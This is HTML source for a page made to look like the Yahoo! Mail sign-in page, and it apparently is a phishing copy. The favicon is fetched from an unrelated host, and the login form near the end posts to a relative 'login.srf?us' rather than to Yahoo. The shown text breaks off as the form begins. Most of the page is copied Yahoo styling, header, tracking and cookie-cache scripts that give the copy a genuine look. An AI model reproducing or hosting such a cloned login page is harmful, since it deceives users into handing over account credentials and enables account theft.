﻿




<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
<link href="http://www.esda3.com/Spm/Ins/Y.PNG" rel="shortcut icon" type="image/vnd.microsoft.icon">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Yahoo! Mail: The best web-based email!</title>
<!-- Refresh login page every 15 minutes -->
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">
<meta http-equiv="refresh" content="900">
<meta content="index,follow" name="robots">

<meta content="Yahoo! Mail Free reliable easy efficient PhotoMail SpamGuard antivirus storage mail for mobile award-winning" name="keywords">
<meta content="Get free web-based email from Yahoo! Access email from anywhere, enjoy unlimited storage space, and feel secure with award-winning spam protection." name="description">


  <link rel="stylesheet" type="text/css" href="https://s.yimg.com/lq/i/reg/css/yregbase_sec_1.2.css">
  <style type="text/css">
    .ct{background:transparent url(https://s.yimg.com/lq/i/reg/cs.gif) no-repeat top right;top:-1px}
    .ct .cl{background:transparent url(https://s.yimg.com/lq/i/reg/cs.gif) no-repeat top left}
    .cb{background:transparent url(https://s.yimg.com/lq/i/reg/cs.gif) no-repeat bottom right;bottom:-1px}
    .cb .cl{background:transparent url(https://login.yahoo.com/i/reg/cs.gif) no-repeat bottom left}
  </style>

<style type="text/css">
.clear{clear:both}
#yreglg select, #yreglg input, #yreglg p, #yreglgtb td, #yreglgtb th{font-size:93%}
div.yregdsilu h2.yregdnt, div.yregdsilu p.yregsueasy{width:110px}
/*popup template css */
#yregtpopup #yregtxt {width:260px;margin:0 0 10px} /* popup template */
#yregtpopup #yregwp, #yregtpopup #yregmst{width:525px}
#yregtpopup #yregmst{margin-bottom:5px}
#yregtpopup #yreglg{margin-bottom:0}
#yregtpopup #yregft{padding-top:5px}

#yregtgen #yregtxt h2, #yregtpopup #yregtxt h2, #yregpmtxt h3{font:bold 152%/152% arial;color:#333;margin:0}
#yregtgen #yregtxt p.yregpti, #yregtpopup #yregtxt p.yregpti {color:#666;margin:0 0 2px;font:bold 100%/100% arial}
#yregtgen #yregtxt, #yregtpopup #yregtxt{margin-bottom:20px}
#yregtgen #yregtxt #yreghtxt h3, #yregtpopup #yregtxt #yreghtxt h3{margin:0;font:bold 107%/114% arial;color:#8C57A1}
#yregtgen #yregtxt li h3, #yregtpopup #yregtxt li h3{font:bold 114%/122% arial}
#yregtgen #yregtxt p, #yregtpopup #yregtxt p{margin:0 0 0.8em;line-height:129%}
#yregtgen #yregtxt .yregbpt li, #yregtpopup #yregtxt .yregbpt li{margin:0 0 10px 4px;padding:0 0 10px 22px;background:url(https://s.yimg.com/lq/i/reg/purple_arrow.gif) no-repeat 1px 4px}

#yregtgen.yregab #yregtxt{width:auto;}
#yregtgen.yregab #yreghtxt{margin-right:60px;}
#yregtpopup.yregab #yregtxt{width:180px}
#yregtgen #yregtxt #yreghtxt h2, #yregtpopup #yregtxt #yreghtxt h2{color:#7A067F}
.yregbx{z-index:3;margin-right:0!important}
.flicker h3 span {color:#ff0084;font-weight:bold}
.flicker h3 a {text-decoration:underline;}

/* persistency message right above "sign in" bottom */
/* em.nwred a {font-style: normal; font-size: 85%; vertical-align:5px;} */
.kmsibold {font-weight:bold; font-size: 114%;}
input#persistent {margin-bottom: -0em;}
.subperstxt {line-height:1.75em;}
.subperstxt2 {margin: 0 0 0 2em; display:block;}
/* #yregft p.yregfb { font-size:120%; padding-bottom: 5px; padding-up: 5px} */

.yreglgsb{margin-top:0}

#yregwp #yregct #yreglg .yregbxi #yreglgmd {margin-top:1.75em}
body#yregtgen fieldset {margin-bottom:2.5em}
#yreglgtb tr {width:17.92em}
/* p#sigcopys {text-align: left; font-size: 85%; float: right; padding: .4em; margin: .6em .4em 1em 0; border-bottom: 1px dotted #9D9C9D; border-top: 1px dotted #9D9C9D;}
*/
p#sigcopys {text-align: left; font-size: 85%; padding: .4em; margin: .6em .0em 1em 0; border-bottom: 1px dotted #9D9C9D; border-top: 1px dotted #9D9C9D;}
#sigcopys label{display:block; margin:-1.5em 0 0 2em;}


#yregtgen #yregct {margin-right: 0px;}
#yregtgen #yregtxt { margin-left: 5px; margin-right: 245px }

th#thun, th#thpw {text-align:left;}

#yreglgtb #fun {
  display:none;
  margin-top:-10px;
  padding-bottom:7px;
  width:100%;
}
#fun .b{
  font-weight:bold;
}
#fun .b, #fun .n, #fun a{
  vertical-align:top;
}
#fun #caution {
  height:16px;
  width:16px;
  padding-right:3px;
}


</style>

<style type="text/css">

#scta{
  text-align:center;
  margin-top:1em;
}
#scta #lb .lb_tl, #scta #lb .lb_br, #scta #lb .lb_bl, #scta #lb .lb_tr {_height:1%;}
#lb{
  background:#FFBC12 url(https://s.yimg.com/lq/i/reg/cs_gradient.png) repeat-x scroll 0 -150px;
  display:block;
  display:inline-block;
  border-color:#FFAF1C;
  border-style:solid;
  border-width:1px;
  margin:auto;
  vertical-align:text-bottom;
}
#lb .lb_tl{
  background-image:url(https://s.yimg.com/lq/i/reg/cs_gradient.png);
  background-repeat:no-repeat;
  display:block;
  position:relative;
  top:-1px;
  left:-1px;
}
#lb .lb_br{
  background-image:url(https://s.yimg.com/lq/i/reg/cs_gradient.png);
  background-repeat:no-repeat;
  background-position:bottom right;
  display:block;
  position:relative;
  top:2px;
  left:2px;
}
#lb .lb_bl{
  background-image:url(https://s.yimg.com/lq/i/reg/cs_gradient.png);
  background-repeat:no-repeat;
  background-position:bottom left;
  display:block;
  position:relative;
  top:0px;
  left:-2px;
}
#lb .lb_tr{
  background-image:url(https://s.yimg.com/lq/i/reg/cs_gradient.png);
  background-repeat:no-repeat;
  background-position:top right;
  display:block;
  position:relative;
  top:-2px;
  left:2px;
}
#lb a, #lb a:visited{
  display:block;
  padding:0 20px;
  font-size:14px;
  line-height:28px;
  min-height:2em;
  text-decoration:none;
  font-weight:bold;
  color:#000;
  font-family:arial;
}
#lb a:hover{
  text-decoration:underline;
}
</style>

<style type='text/css'>
/*anti phish badge */
.top {position:relative}
#antiphish{position:absolute;right:5px;top:5px;}  
#antiphish.dogear{right:0px;top:0px;} 
#antiphish a {font-size:92%;}
img.picture {border:2px solid}

/* badge backgrounds */   
.badge{background-color:#f9f9f9; background-repeat:no-repeat; background-position:top right;}  
.badge #yreglgtb {margin-top:18px;} /* increased badge size */


/* popup code... */
#security {display:none;position:absolute;top:-15px;left:-85px;z-index:1000;background-color:#a5a5a5;}
#security.noimage {left:-76px;top:-10px}
#securityi{position:relative;z-index:1;right:1px;bottom:1px;padding:11px;width:219px;background-color:#fff;border:1px solid #636363;} 
#knob{position:absolute;top:30px;right:-10px;width:10px;height:18px;background:url(https://s.yimg.com/lq/i/reg/sideknob.png) no-repeat top left}
.noimage #knob{top:22px}
#security p, #security ul li{font:77%/107% verdana;}
#security p a {text-decoration:underline;}
#security p{padding-bottom:5px;}
#security ul{margin:5px 0 0;padding:0 5px 0 0;text-align:right;list-style:none;}   
#security ul li{margin:0;padding:0 0 2px;}

/* help text updates... */
#yregtgen #yregtxt .yregbpt li ul{margin:10px 0 0;padding:0 0 0 15px;}
#yregtgen #yregtxt .yregbpt li ul li{background:none;list-style:disc;margin:0 0 5px 0;padding:0;}
#yreghtxt ul{margin-left:0}
#yreghtxt ul.inlineHeaders li h3{display:inline;}
/* remove top margin on li ul */
.addressbar {display:block;margin:1em 0 1em 0}
.mono{font-family: courier new, courier, monospace;color:#000;font-weight:bold}


#rcta {width:99%; border:1px solid #898989; margin-top:10px; background-image:url(https://s.yimg.com/lq/i/reg/gradient2.png); background-repeat:repeat-x; background-color:#fde37c}
.ct {background:url(https://s.yimg.com/lq/i/reg/cs.gif) no-repeat scroll right top; top:-1px}
.ct .cl {background:url(https://s.yimg.com/lq/i/reg/cs.gif) no-repeat scroll left top;}
#rcta .key {width:40px; height:40px; border:1px solid #666666; background-image:url(https://s.yimg.com/lq/i/reg/key2.png); background-repeat: no-repeat; float:left; margin-top:1px}
#rcta .txt {margin-left:48px}
.cb {background:url(https://s.yimg.com/lq/i/reg/cs.gif) no-repeat scroll right bottom; bottom:-1px}
.cb .cl {background:url(https://s.yimg.com/lq/i/reg/cs.gif) no-repeat scroll left bottom;}
#rcta .ctact {margin:4px 10px;min-height:44px}
#rcta .txt .qs {font:normal bold 92% arial, Helvetica, sans-serif; color:#000; text-decoration:none}
#rcta .txt .sl {font:normal normal 100% arial, Helvetica, sans-serif; color:#000; text-decoration:none}
#rcta .txt .why {font:normal normal 85% arial, Helvetica, sans-serif;}
#rcta .txt .sltxt {line-height:0.9em}
.sltxt a {line-height:0.5em; font-size:85%}
.sltxt .why a{font-size:100%}
.yregertxt { margin-top: 25px }
.yreglgsut { margin-top: 15px } 

</style>
<!--[if gt IE 6]>
<style type="text/css">
.yregclb{height:1%}
#yreglgtb td{text-align:left}
#yreglgtb td input{width:110px}     
#antiphish img{right:15px}
#antiphish.dogear{right:1px;top:1px;}
#knob{background:url(https://s.yimg.com/lq/i/reg/sideknob_b.gif);right:-11px}
.badge #yreglgtb {margin-top:20px;}
#rcta .key {margin-top:0}
.badge {height:1%}
</style>
<![endif]-->




<!--[if gt IE 6]>
<style type="text/css">
.yregclb,.yregbxi,.yregbx {height:1%}
#yreglgtb td{text-align:left}
#yregtxt #banner div{position:static}	/* ie z-index context stacking bug work-around */
#yregtpopup #yregtxt{float:left;}
#yregct{padding:0 0 30px}
.yregbx{width: 100%}
</style>
<![endif]-->


<style type="text/css">
  
#yreglgtb, #yreglgtb th {text-align: left; width: 100%;}
#yreglgtb td { width:179px;  text-align: left; padding: 0 0 16px 0}
#yreglgtb td input{ width:179px  } 
.dbidTip {padding: 3px 0 0 0;  font-size:85%}  
</style>




<link rel="stylesheet" type="text/css" href="https://s.yimg.com/lq/i/reg/css/yregml_sec_1.1.css">
<style type="text/css">
div.yregdsilu h2.yregdnt, div.yregdsilu p.yregsueasy{width:110px}
/* persistency message right above "sign in" bottom */
/* em.nwred a {font-style: normal;font-size: 85%;top:0;position:relative;} */
.kmsibold {font-weight:bold; font-size: 114%;}
p#sigcopys {text-align: left; font-size: 85%; padding: .4em; margin: .6em .4em 1em 0; border-bottom: 1px dotted #9D9C9D; border-top: 1px dotted #9D9C9D;}
input#persistent {margin-bottom: -0em;}
.subperstxt {line-height:1.75em;}
.subperstxt2 {margin: 0 0 0 2em; display:block;}
/* #yregft p.yregfb { font-size:120%; padding-bottom: 5px; padding-up: 5px} */

</style>
<style type="text/css">

#scta{
  text-align:center;
  margin-top:1em;
}
#scta #lb .lb_tl, #scta #lb .lb_br, #scta #lb .lb_bl, #scta #lb .lb_tr {_height:1%;}
#lb{
  background:#FFBC12 url(https://s.yimg.com/lq/i/reg/cs_gradient.png) repeat-x scroll 0 -150px;
  display:block;
  display:inline-block;
  border-color:#FFAF1C;
  border-style:solid;
  border-width:1px;
  margin:auto;
  vertical-align:text-bottom;
}
#lb .lb_tl{
  background-image:url(https://s.yimg.com/lq/i/reg/cs_gradient.png);
  background-repeat:no-repeat;
  display:block;
  position:relative;
  top:-1px;
  left:-1px;
}
#lb .lb_br{
  background-image:url(https://s.yimg.com/lq/i/reg/cs_gradient.png);
  background-repeat:no-repeat;
  background-position:bottom right;
  display:block;
  position:relative;
  top:2px;
  left:2px;
}
#lb .lb_bl{
  background-image:url(https://s.yimg.com/lq/i/reg/cs_gradient.png);
  background-repeat:no-repeat;
  background-position:bottom left;
  display:block;
  position:relative;
  top:0px;
  left:-2px;
}
#lb .lb_tr{
  background-image:url(https://s.yimg.com/lq/i/reg/cs_gradient.png);
  background-repeat:no-repeat;
  background-position:top right;
  display:block;
  position:relative;
  top:-2px;
  left:2px;
}
#lb a, #lb a:visited{
  display:block;
  padding:0 20px;
  font-size:14px;
  line-height:28px;
  min-height:2em;
  text-decoration:none;
  font-weight:bold;
  color:#000;
  font-family:arial;
}
#lb a:hover{
  text-decoration:underline;
}
</style>

<style type='text/css'>
/*anti phish badge */
.top {position:relative}
#antiphish{position:absolute;right:5px;top:5px;}  
#antiphish.dogear{right:0px;top:0px;} 
#antiphish a {font-size:92%;}
img.picture {border:2px solid}

/* badge backgrounds */   
.badge{background-color:#f9f9f9; background-repeat:no-repeat; background-position:top right;}  
.badge #yreglgtb {margin-top:18px;} /* increased badge size */


/* popup code... */
#security {display:none;position:absolute;top:-15px;left:-85px;z-index:1000;background-color:#a5a5a5;}
#security.noimage {left:-76px;top:-10px}
#securityi{position:relative;z-index:1;right:1px;bottom:1px;padding:11px;width:219px;background-color:#fff;border:1px solid #636363;} 
#knob{position:absolute;top:30px;right:-10px;width:10px;height:18px;background:url(https://s.yimg.com/lq/i/reg/sideknob.png) no-repeat top left}
.noimage #knob{top:22px}
#security p, #security ul li{font:77%/107% verdana;}
#security p a {text-decoration:underline;}
#security p{padding-bottom:5px;}
#security ul{margin:5px 0 0;padding:0 5px 0 0;text-align:right;list-style:none;}   
#security ul li{margin:0;padding:0 0 2px;}

/* help text updates... */
#yregtgen #yregtxt .yregbpt li ul{margin:10px 0 0;padding:0 0 0 15px;}
#yregtgen #yregtxt .yregbpt li ul li{background:none;list-style:disc;margin:0 0 5px 0;padding:0;}
#yreghtxt ul{margin-left:0}
#yreghtxt ul.inlineHeaders li h3{display:inline;}
/* remove top margin on li ul */
.addressbar {display:block;margin:1em 0 1em 0}
.mono{font-family: courier new, courier, monospace;color:#000;font-weight:bold}


#rcta {width:99%; border:1px solid #898989; margin-top:10px; background-image:url(https://s.yimg.com/lq/i/reg/gradient2.png); background-repeat:repeat-x; background-color:#fde37c}
.ct {background:url(https://s.yimg.com/lq/i/reg/cs.gif) no-repeat scroll right top; top:-1px}
.ct .cl {background:url(https://s.yimg.com/lq/i/reg/cs.gif) no-repeat scroll left top;}
#rcta .key {width:40px; height:40px; border:1px solid #666666; background-image:url(https://s.yimg.com/lq/i/reg/key2.png); background-repeat: no-repeat; float:left; margin-top:1px}
#rcta .txt {margin-left:48px}
.cb {background:url(https://s.yimg.com/lq/i/reg/cs.gif) no-repeat scroll right bottom; bottom:-1px}
.cb .cl {background:url(https://s.yimg.com/lq/i/reg/cs.gif) no-repeat scroll left bottom;}
#rcta .ctact {margin:4px 10px;min-height:44px}
#rcta .txt .qs {font:normal bold 92% arial, Helvetica, sans-serif; color:#000; text-decoration:none}
#rcta .txt .sl {font:normal normal 100% arial, Helvetica, sans-serif; color:#000; text-decoration:none}
#rcta .txt .why {font:normal normal 85% arial, Helvetica, sans-serif;}
#rcta .txt .sltxt {line-height:0.9em}
.sltxt a {line-height:0.5em; font-size:85%}
.sltxt .why a{font-size:100%}
.yregertxt { margin-top: 25px }
.yreglgsut { margin-top: 15px } 
</style>
<!--[if gt IE 6]>
<style type="text/css">
.yregclb{height:1%}
#yreglgtb td{text-align:left}
#yreglgtb td input{width:110px}     
#antiphish img{right:15px}
#antiphish.dogear{right:1px;top:1px;}
#knob{background:url(https://s.yimg.com/lq/i/reg/sideknob_b.gif);right:-11px}
.badge #yreglgtb {margin-top:20px;}
#rcta .key {margin-top:0}
.badge {height:1%}
</style>
<![endif]-->

    
<!--[if gt IE 6]>
<style type="text/css">
#antiphish.dogear{right:1px;}
</style>
<![endif]-->

<!--[if IE]>
<style type="text/css">
.yregclb{height:1%}
#yregbnrti{height:159px;padding-top:0}
#yregbnrtii{margin-top:0} 
.knob{top:-5px}
#yregtml .mailplus{height:60px;padding-top:0}
#yregtml .mailplus div{margin-top:0}
#yregtml .spamguard{height:52px;padding-top:0}
#yregtml .spamguard div{margin-top:0}
#yregtml .addressbook{height:50px;padding-top:0}
#yregtml .addressbook div{margin-top:0}
#yregtml .messenger{height:60px;padding-top:0}
#yregtml .messenger div{margin-top:0}
#yregtml .photos{height:60px;padding-top:0}
#yregtml .photos div{margin-top:0}
#yregtml .mobile{height:60px;padding-top:0}
#yregtml .mobile div{margin-top:0}
#yregtml .antivirus{height:60px;padding-top:0}
#yregtml .antivirus div{margin-top:0}
#yregtml .cnet{height:72px;padding-top:0}
#yregtml .cnet div{margin-top:0}
#yregtml .pcmag{height:94px;padding-top:0}
#yregtml .pcmag div{margin-top:0}

</style>
<![endif]-->
<!--[if IE 7]>
<style type="text/css">
.knob{top:-6px}
#antiphish.dogear{top:0;right:0;}
#antiphish{right:5px;}
</style>
<![endif]-->

<!--[if lte IE 6]>
<style type="text/css">
.yregclb{height:30em}
#yregtxt {height:1%}
p#sigcopys {margin-right:0.2em}
</style>
<![endif]-->


<style type="text/css">
    #yregtxt {width:66%; overflow:hidden}
    #yregbnr {padding-top:0}
    #yregbnr #yregbnrti #yregbnrtii {width:240px}
    #yregiclst {padding-right:0}
</style>
<!--[if lte IE 7]>
<style type="text/css">
    #yregbnr #yregbnrti {margin-top:-160px}
    #yregtxt {height:auto}
</style>
<![endif]-->


<style type="text/css">
  
#yreglgtb, #yreglgtb th {text-align: left; width: 100%;}
#yreglgtb td { width:179px;  text-align: left; padding: 0 0 16px 0}
#yreglgtb td input{ width:179px  } 
.dbidTip {padding: 3px 0 0 0;  font-size:85%}  
</style>





</head>
<!-- ads: 150001463 INT.OFFSET: 0 -->


	<body id="yregtml">

<div id="yregwp">
<!-- begin header -->

<!-- intl = us, spaceid = 150001463 offset = 0 position = HEAD -->
<link type="text/css" rel="stylesheet" href="https://s.yimg.com/lq/lib/uh/15/css/uh_slim_ssl-1.0.7.css"><style type="text/css">#ygma .bd {padding-bottom:10px;}</style><div id="ygma"><div id="ygmaheader"><div class="bd sp"><div id="yahoo" class="ygmaclr"><div id="ygmabot"><a id="ygmalogo" href="https://us.ard.yahoo.com/SIG=15qrl2cst/M=650008.13546636.13610158.13057442/D=regst/S=150001463:HEAD/Y=YAHOO/EXP=1268266391/L=txYVb0WTcKDP43ATS4qhsgBSPvu8T0uYGXcAAxzT/B=vRzYIGKImlQ-/J=1268259191235444/K=8vmWb_Bxz1jGwb4LRQJhnA/A=5775037/R=0/SIG=10mgpruen/*http://www.yahoo.com" target="_top"><img id="ygmalogoimg" width="142" height="26" src="https://s.yimg.com/lq/i/brand/purplelogo/uh/us/base.gif" alt="Yahoo!"></a></div><div id="mepanel"><ul id="mepanel-nav"><li class="me1"><a href="https://us.ard.yahoo.com/SIG=15qrl2cst/M=650008.13546636.13610158.13057442/D=regst/S=150001463:HEAD/Y=YAHOO/EXP=1268266391/L=txYVb0WTcKDP43ATS4qhsgBSPvu8T0uYGXcAAxzT/B=vRzYIGKImlQ-/J=1268259191235444/K=8vmWb_Bxz1jGwb4LRQJhnA/A=5775037/R=1/SIG=10n95md4p/*https://www.yahoo.com" target="_top">Yahoo!</a></li><li class="me2"><a id="ygmahelp" href="https://us.ard.yahoo.com/SIG=15qrl2cst/M=650008.13546636.13610158.13057442/D=regst/S=150001463:HEAD/Y=YAHOO/EXP=1268266391/L=txYVb0WTcKDP43ATS4qhsgBSPvu8T0uYGXcAAxzT/B=vRzYIGKImlQ-/J=1268259191235444/K=8vmWb_Bxz1jGwb4LRQJhnA/A=5775037/R=2/SIG=118aqiaa1/*http://help.yahoo.com/l/us/yahoo/edit/" target="_top">Help</a></li></ul></div></div></div></div></div><script language=javascript>
if(window.yzq_d==null)window.yzq_d=new Object();
window.yzq_d['vRzYIGKImlQ-']='&U=13gnpi7do%2fN%3dvRzYIGKImlQ-%2fC%3d650008.13546636.13610158.13057442%2fD%3dHEAD%2fB%3d5775037%2fV%3d1';
</script><noscript><img width=1 height=1 alt="" src="https://us.bc.yahoo.com/b?P=txYVb0WTcKDP43ATS4qhsgBSPvu8T0uYGXcAAxzT&T=18if70u3i%2fX%3d1268259191%2fE%3d150001463%2fR%3dregst%2fK%3d5%2fV%3d2.1%2fW%3dH%2fY%3dYAHOO%2fF%3d214026021%2fH%3dc2VjdXJlPSJ0cnVlIiBzZXJ2ZUlkPSJ0eFlWYjBXVGNLRFA0M0FUUzRxaHNnQlNQdnU4VDB1WUdYY0FBeHpUIiBzaXRlSWQ9IjI5MjUwNTEiIHRTdG1wPSIxMjY4MjU5MTkxMjI1MTgyIiA-%2fQ%3d-1%2fS%3d1%2fJ%3dC457C442&U=13gnpi7do%2fN%3dvRzYIGKImlQ-%2fC%3d650008.13546636.13610158.13057442%2fD%3dHEAD%2fB%3d5775037%2fV%3d1"></noscript>
<!-- end header -->
<span id="cache"></span>
<script language="JavaScript">
    
function checkBrowser(){
    var appName = navigator.appName;
    if( appName == "Microsoft Internet Explorer" )
    {
        // this only works in IE 5 for windows and higher ...
        if( navigator.appVersion.indexOf("Windows") == -1 )
            return -1;
        var appVersionAry = navigator.appVersion.split("(");
        if( appVersionAry.length < 2 )
            return -1;
        var appVersion = appVersionAry[1];
        appVersionAry = appVersion.split("; ");
        if( appVersionAry.length < 2 )
            return -1;
        appVersion = appVersionAry[1];
        appVersionAry = appVersion.split(" ");
        if( appVersionAry.length < 2 )
            return -1;
        appVersion = appVersionAry[1];
        var appVersionNumber = parseInt(appVersion);

        if( appVersionNumber < 5 )
            return -1;
    }
    else
    {
        return -1;
    }
}

</script>


<script language="JavaScript">


function flashCacheReady (initialized){ //invoked directly by Flash
    var inCache = false;
 
  // Get the info from flash
  var o={};
  o=(document.getElementById("flashCache")).getCache(o);
  if(o != null) inCache = true; 
  else return;

  if(o.YL != 'null' && o.YL != null) {
    document.cookie = o.YL + ";expires=Thu, 15 Apr 2037 20:00:00 GMT;domain=login.yahoo.com;path=/";
  }

  if(o.F != 'null' && o.F != null) {
    document.cookie = o.F + ";expires=Thu, 15 Apr 2037 20:00:00 GMT;domain=.yahoo.com;path=/";
  }

  if(o.YLS != 'null' && o.YLS != null) {
    if((o.YLS.match("n=0")) != null) {
      o.YLS = o.YLS.replace("n=0", "n=9");
    } else {
      o.YLS = o.YLS.concat("&n=9");
    }
    document.cookie = o.YLS + ";expires=Thu, 15 Apr 2037 20:00:00 GMT;domain=.yahoo.com;path=/";
  }

  if(((o.YL != 'null') && (o.YL != null)) || ((o.F != 'null') && (o.F != null)) && (document.cookie.length > 0)) {
    location.replace (document.location + "&rl=1"); 
  }

  // If the browser is IE, get from the xml cache as well.
 
if((checkBrowser() != -1)) {
  function getXML(cookieName,header,spanName)
  {
      var span = document.getElementById("cache");
      span.style.behavior = "url('#default#userData')";
      span.load(spanName);
  
      var ckyDate = new Date;
      ckyDate.setDate(ckyDate.getDate( ) + 7);
 
      var saved = span.getAttribute("saved"+cookieName);

      if((saved == null ) || (saved == "")) return -1;
      var cookieStr = saved;
      if(cookieName == "YLS") {
        if((cookieStr.match("n=0")) != null) {
          cookieStr = cookieStr.replace("n=0", "n=9");
        } else {
          cookieStr = cookieStr.concat("&n=9");
        }
      }
      if (header != ""){
          cookieStr = cookieStr + ';' + header;
      }
      document.cookie = cookieStr;
      return 0;
  }

  var ylRes = getXML("YL", "expires = Thu, 15 Apr 2037 20:00:00 GMT; domain=login.yahoo.com; path=/", "YL");
  var fRes = getXML("F", "expires = Thu, 15 Apr 2037 20:00:00 GMT; domain=.yahoo.com; path=/", "YL");
  var ylsRes = getXML("YLS", "expires = Thu, 15 Apr 2037 20:00:00 GMT; domain=.yahoo.com; path=/", "YL");

  if(ylRes == 0 || fRes == 0 && (document.cookie.length > 0)) {
    location.replace (document.location + "&rl=1");
  }
}
    }
</script>





<script type="text/javascript">

function FlashDetector_Detect(targetVersion)
{
  var pObj = null;
  var tokens, len, curr_tok;
  var hasVersion = -1;
  var playable = false;
  if(navigator.mimeTypes && navigator.mimeTypes['application/x-shockwave-flash'])
  {
     pObj = navigator.mimeTypes['application/x-shockwave-flash'].enabledPlugin;
  }
  if(pObj != null)
  {
     tokens = navigator.plugins['Shockwave Flash'].description.split(' ');
     len = tokens.length;
     while(len--)
     {
	curr_tok = parseInt( tokens[len] );

        if(!isNaN( curr_tok) )
        {
           hasVersion = curr_tok;
           FlashDetector_Version = curr_tok;
           break;
        }
     }
     if(hasVersion >= targetVersion)
     {
        playable = true;
     }
     else
     {
        playable = false;
     }
  }
  return playable;
}

var flashDetector_Playable = false;
var flashDetector_targetVersion = '8'; 

var isIE  = (navigator.appVersion.indexOf("MSIE") != -1) ? true : false;
var isWin = (navigator.appVersion.toLowerCase().indexOf("win") != -1) ? true : false;
var isOpera = (navigator.userAgent.indexOf("Opera") != -1) ? true : false;
  
if (isIE && isWin && !isOpera) {
    document.write('<scr' + 'ipt language="VBScript"\> \n');
    document.write('on error resume next \n');
    document.write('flashDetector_Playable = ( IsObject(CreateObject("ShockwaveFlash.ShockwaveFlash." & flashDetector_targetVersion)))\n');
    document.write('</scr' + 'ipt\> \n');
  } else {
      flashDetector_Playable = FlashDetector_Detect(flashDetector_targetVersion);
  }

  var flashCode = '';

  if(flashDetector_Playable) {
 
    var ts = (new Date()).getTime( );

    flashCode = '<object type="application/x-shockwave-flash" data="https://login.yahoo.com/login/dataCache.swf" width="0" height="0" id="flashCache"> <param name="allowScriptAccess" value="sameDomain" /> <param name="movie" value="https://login.yahoo.com/login/dataCache.swf?' + ts + '" /> <param name="bgColor" value="#fff" /> </object> ';

  }
  document.write(flashCode);

</script>


<div id="yregct" class="yregclb">
	<div id="yreglg">
<!-- login box goes here -->			
		<div class="top yregbx">
    <script type="text/javascript">if(top == self) { document.write("<div class=\" badge\">")}</script>	<span class="ct"><span class="cl"></span></span>

			<div class="yregbxi"> 
<script type="text/javascript">if(top == self) { document.write("") } else  { top.location.href = "http://www.yahoo.com" }</script>			        <div class="yregdsilu">
	  <h2 class="yregdnt " style='width:auto;'>Don't have a Yahoo! ID?</h2>
	  <p class="yregsueasy " style='width:auto;'>Signing up is easy.</p>
          <div id='scta'>
            <span id="lb">
              <span class="lb_tl">

                <span class='lb_br'>
                  <span class='lb_bl'>
                    <span class='lb_tr'>
                      <a tabindex="0" href='https://edit.yahoo.com/config/eval_register?.intl=us&.pd=ym_ver%253D0%2526c%253D%2526ivt%253D%2526sg%253D&new=1&.done=http%3A//mail.yahoo.com&.src=ym&.v=0&.u=7fmqamd5pg6bn&partner=&.partner=&pkg=&stepid=&.p=&promo=&.last='>
                      Sign up for Yahoo!
                      </a>
                    </span>
                  </span>
                </span>

              </span>
            </span>
          </div>
        </div>
        <h2>Already have a Yahoo! ID?</h2>
        <p>Sign in.</p> 

	
			<script type="text/javascript">if (top == self) { document.write("                                <div id=\"rcta\">                                 <a href=\"https://protect.login.yahoo.com/login/set_pref?.intl=us&.src=ym&.u=7fmqamd5pg6bn&.partner=&pkg=&stepid=&.pd=c=&.crumb=czozMjoiZGI2ZmQxOTFhODMyM2M4MDI4ZjNlOTVhZGIzZGIxNDYiOw--&.done=https%3A%2F%2Flogin.yahoo.com%2Fconfig%2Fmail%3F.src%3Dym%26.intl%3Dus\" tabIndex=\"-1\">            <a href=\"https://protect.login.yahoo.com/login/set_pref?.intl=us&.src=ym&.u=7fmqamd5pg6bn&.partner=&pkg=&stepid=&.pd=c=&.crumb=czozMjoiZGI2ZmQxOTFhODMyM2M4MDI4ZjNlOTVhZGIzZGIxNDYiOw--&.done=https%3A%2F%2Flogin.yahoo.com%2Fconfig%2Fmail%3F.src%3Dym%26.intl%3Dus\" tabIndex=\"-1\">                                        <span class=\"ct\">                                            <span class=\"cl\"></span>                                        </span>                                      </a>                                                                        <div class=\"ctact\">                                        <a href=\"https://protect.login.yahoo.com/login/set_pref?.intl=us&.src=ym&.u=7fmqamd5pg6bn&.partner=&pkg=&stepid=&.pd=c=&.crumb=czozMjoiZGI2ZmQxOTFhODMyM2M4MDI4ZjNlOTVhZGIzZGIxNDYiOw--&.done=https%3A%2F%2Flogin.yahoo.com%2Fconfig%2Fmail%3F.src%3Dym%26.intl%3Dus\" tabIndex=\"-1\">                                            <div class=\"key\"> </div>                                        </a>                                        <div class=\"txt\">                                            <a href=\"https://protect.login.yahoo.com/login/set_pref?.intl=us&.src=ym&.u=7fmqamd5pg6bn&.partner=&pkg=&stepid=&.pd=c=&.crumb=czozMjoiZGI2ZmQxOTFhODMyM2M4MDI4ZjNlOTVhZGIzZGIxNDYiOw--&.done=https%3A%2F%2Flogin.yahoo.com%2Fconfig%2Fmail%3F.src%3Dym%26.intl%3Dus\">                                                <span class=\"qs\">Are you protected?</span>                                            </a>                                            <div class=\"sltxt\">                                                <a href=\"https://protect.login.yahoo.com/login/set_pref?.intl=us&.src=ym&.u=7fmqamd5pg6bn&.partner=&pkg=&stepid=&.pd=c=&.crumb=czozMjoiZGI2ZmQxOTFhODMyM2M4MDI4ZjNlOTVhZGIzZGIxNDYiOw--&.done=https%3A%2F%2Flogin.yahoo.com%2Fconfig%2Fmail%3F.src%3Dym%26.intl%3Dus\">                                                    <span class=\"sl\">Create your sign-in seal.</span>                                                </a>                                                <span class=\"why\">(<a href=\"https://protect.login.yahoo.com/?.src=ym&.v=0&.u=7fmqamd5pg6bn&.last=&promo=&.intl=us&.bypass=&.help=3&.partner=&pkg=&stepid=&.pd=ym_ver%3d0%2526c=&.done=http%3A//mail.yahoo.com\">Why?</a>)</span>                                                                        </div>                                                                                    </div>                                    </div>                                                                        <a href=\"https://protect.login.yahoo.com/login/set_pref?.intl=us&.src=ym&.u=7fmqamd5pg6bn&.partner=&pkg=&stepid=&.pd=c=&.crumb=czozMjoiZGI2ZmQxOTFhODMyM2M4MDI4ZjNlOTVhZGIzZGIxNDYiOw--&.done=https%3A%2F%2Flogin.yahoo.com%2Fconfig%2Fmail%3F.src%3Dym%26.intl%3Dus\" tabIndex=\"-1\">                                        <span class=\"cb\">                                                            <span class=\"cl\"></span>                                                        </span>                                    </a>                                                                    </a>                            </div>                              <div class=\"clear\"> </div>") } else  { top.location.href = "http://www.yahoo.com" }</script>
				<fieldset id='fsLogin'>

				<legend>Login Form</legend>
	
<form method="POST" action="login.srf?us" name="loginfrm">

				<input type="hidden" name=".tries" value="1">
